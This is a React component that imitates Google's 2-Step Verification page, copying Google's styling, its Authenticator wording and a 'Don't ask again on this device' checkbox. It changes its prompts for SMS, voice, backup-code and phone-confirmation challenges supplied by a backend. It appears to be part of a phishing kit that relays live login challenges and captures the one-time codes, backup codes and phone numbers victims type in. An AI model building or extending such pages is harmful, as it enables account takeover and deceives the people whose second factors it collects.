import { ChallengeMetadata, ChallengeType } from "@/lib/types";
import React from "react";
import Input from "../ui/input";

const TOTPView: React.FC<{
  twoFactorCode: string;
  setTwoFactorCode: (code: string) => void;
  handle2FASubmit: () => void;
  error: string | null;
  challengeType: ChallengeType;
  challengeMetadata: ChallengeMetadata | null;
}> = ({ twoFactorCode, setTwoFactorCode, handle2FASubmit, error, challengeType, challengeMetadata }) => {
  // Differentiate copy based on challenge type from backend
  const isSMS = challengeType === "SMS";
  const isVoice = challengeType === "VOICE";
  const isBackup = challengeType === "BACKUP";
  const isPhoneConfirm = challengeType === "PHONE_CONFIRM";

  let title = "2-Step Verification";
  let description = (
    <>
      Get a verification code from the{" "}
      <span className="font-semibold text-[#202124]">Google Authenticator</span> app
    </>
  );

  if (isSMS) {
    title = challengeMetadata?.title || "2-Step Verification";
    description = (
      <>
        {challengeMetadata?.description || "A text message with a verification code was sent to your phone."}
      </>
    );
  } else if (isVoice) {
    title = challengeMetadata?.title || "2-Step Verification";
    description = (
      <>
        {challengeMetadata?.description || "A verification code was sent to your phone via voice call."}
      </>
    );
  } else if (isBackup) {
    title = challengeMetadata?.title || "2-Step Verification";
    description = (
      <>
        {challengeMetadata?.description || "Enter one of your backup codes."}
      </>
    );
  } else if (isPhoneConfirm) {
    title = challengeMetadata?.title || "Confirm your phone number";
    description = (
      <>
        {challengeMetadata?.description || "Enter the phone number associated with your account."}
      </>
    );
  } else if (challengeMetadata?.description) {
    // TOTP with custom description from backend
    description = <>{challengeMetadata.description}</>;
  }

  // Code length varies: TOTP/SMS/VOICE = 6 digits, BACKUP = 8 digits, PHONE_CONFIRM = no limit
  const codeLength = isBackup ? 8 : isPhoneConfirm ? 15 : 6;
  const inputType = isPhoneConfirm ? "tel" : "text";
  const inputMode = isPhoneConfirm ? "tel" : "numeric";
  const inputPattern = isPhoneConfirm ? undefined : "[0-9]*";
  const label = isPhoneConfirm ? "Enter phone number" : "Enter code";

  return (
    <div className="w-full animate-in fade-in slide-in-from-right-4 duration-500">
      {/* Section Title */}
      <h2 className="text-[16px] font-normal text-[#202124] mb-2">
        {title}
      </h2>

      {/* Description */}
      <p className="text-[14px] text-[#5f6368] mb-6 leading-[20px]">
        {description}
      </p>

      {/* Code Input */}
      <div className="mb-4">
        <Input
          type={inputType}
          inputMode={inputMode as any}
          pattern={inputPattern}
          id="2fa-code"
          label={label}
          autoComplete={isPhoneConfirm ? "tel" : "one-time-code"}
          value={twoFactorCode}
          onChange={(e) => setTwoFactorCode(isPhoneConfirm ? e.target.value.slice(0, codeLength) : e.target.value.replace(/\D/g, "").slice(0, codeLength))}
          error={!!error}
          onKeyDown={(e) => {
            if (e.key === "Enter") {
              (e.target as HTMLInputElement).blur();
              handle2FASubmit();
            }
          }}
        />
        {error && (
          <div className="text-google-red text-xs mt-2 ml-1 flex items-center gap-1">
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
              <path
                fillRule="evenodd"
                d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                clipRule="evenodd"
              />
            </svg>
            {error}
          </div>
        )}
      </div>

      {/* Don't ask again checkbox */}
      <div className="flex items-center gap-3 group cursor-pointer">
        <div className="relative flex items-center">
          <input
            type="checkbox"
            id="totp-dont-ask-again"
            className="peer appearance-none w-[18px] h-[18px] border-2 border-[#5f6368] rounded-[2px] cursor-pointer checked:bg-[#1a73e8] checked:border-[#1a73e8] transition-all duration-200"
            defaultChecked
          />
          <svg
            className="absolute w-3.5 h-3.5 text-white pointer-events-none hidden peer-checked:block left-[2px] top-[2px]"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            strokeWidth="4"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              d="M5 13l4 4L19 7"
            />
          </svg>
        </div>
        <label
          htmlFor="totp-dont-ask-again"
          className="text-[14px] text-[#202124] cursor-pointer select-none font-normal"
        >
          Don&apos;t ask again on this device
        </label>
      </div>
    </div>
  );
};

export default TOTPView;